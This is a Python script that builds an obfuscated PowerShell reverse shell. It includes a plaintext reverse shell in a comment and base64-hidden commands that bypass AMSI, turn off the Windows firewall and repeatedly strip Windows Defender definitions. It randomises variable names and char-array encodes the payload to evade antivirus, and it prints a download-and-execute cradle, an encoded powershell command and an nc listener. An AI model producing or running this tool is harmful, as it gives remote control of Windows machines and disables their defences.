import os,sys
import base64
import argparse
from random import choice
from makerunner import powershell_b64encode
from makefodhelper import chararray

#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writers(lhost,lport,ptype,mode):
    rsfilename = "rs.txt"

    client = rand_word()
    stream = rand_word()
    sbytes = rand_word()
    sendbyte = rand_word()
    sendback = rand_word()
    sendback2 = rand_word()
    data = rand_word()

    amsi = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQ=="
    kill_fw = "bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZg=="    
    loop_defender = "c3RhcnQtcHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtYXJndW1lbnRsaXN0ICJ3aGlsZSgxKXsmICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbDtzdGFydC1zbGVlcCAtc2Vjb25kcyAzMDB9IiAtd2luZG93c3R5bGUgaGlkZGVuCg=="
    disable_defender = "JiAnQzpcUHJvZ3JhbSBGaWxlc1xXaW5kb3dzIERlZmVuZGVyXE1wQ21kUnVuLmV4ZScgLVJlbW92ZURlZmluaXRpb25zIC1BbGw="    

    amsi = base64.b64decode(amsi).decode()
    kill_fw = base64.b64decode(kill_fw).decode()
    loop_defender = base64.b64decode(loop_defender).decode()
    disable_defender = base64.b64decode(disable_defender).decode()
    rs = "$"+client+" = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+lport+");$"+stream+" = $"+client+".GetStream();[byte[]]$"+sbytes+" = 0..65535|%{0};while(($i = $"+stream+".Read($"+sbytes+", 0, $"+sbytes+".Length)) -ne 0){;$"+data+" = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($"+sbytes+",0, $i);$"+sendback+" = (iex $"+data+" 2>&1 | Out-String );$"+sendback2+"  = $"+sendback+" + 'PS ' + (pwd).Path + '> ';$"+sendbyte+" = ([text.encoding]::ASCII).GetBytes($"+sendback2+");$"+stream+".Write($"+sendbyte+",0,$"+sendbyte+".Length);$"+stream+".Flush()};$"+client+".Close()"

    body = "%s\n%s\n%s\n%s\n%s" % (amsi,kill_fw,loop_defender,disable_defender,rs)

    if mode == "simple":
        chars = chararray(rs)
    if mode == "anti":
        chars = chararray(body)
    chars = ", ".join(chars)
    charscradle = "iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))" % chars
    b64_charscradle = powershell_b64encode(charscradle)

    with open(rsfilename,'w') as f:
        #f.write(amsi + "\n\n")
        #f.write(rs)
        f.write(charscradle)
    f.close()

    print('[+] rs.txt written: %s' % rsfilename)
    return rsfilename,b64_charscradle
    pass

def makers(lhost,lport,ptype,mode):
    rsfilename,b64_charscradle = writers(lhost,lport,ptype,mode)
    if ptype == "remote":
        copy(rsfilename,"/var/www/html/",rsfilename)
        usage = "iex(new-object net.webclient).downloadstring('http://%s/%s')" % (lhost,rsfilename)
        b64_usage = "powershell -enc %s" % powershell_b64encode(usage)
        print('[+] use:\n%s\n%s' % (usage,b64_usage))
    if ptype == "local":
        b64_usage = "powershell -enc %s" % b64_charscradle
        print('[+] use:\n%s' % (b64_usage))

    print('[+] listen:\nsudo rlwrap nc -lvnp %s' % (lport))
    pass 

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=False,dest='ptype',help='remote or local')
    parser.add_argument('--mode','-m',required=False,dest='mode',help='simple or anti (simple or anti-anti-virus')
    args = parser.parse_args()

    lhost = args.host
    lport = args.port
    ptype = args.ptype
    mode = args.mode

    if ptype == None:
        ptype = "0"
    if mode == None:
        mode = "0"

    if ptype == "0":
        print('[+] -t ptype not chosen, default ptype used -> remote')
        ptype = "remote"

    if mode == "0":
        print('[+] -m mode not chosen, default mode used -> anti (anti-anti-virus)')
        mode = "anti"

    makers(lhost,lport,ptype,mode)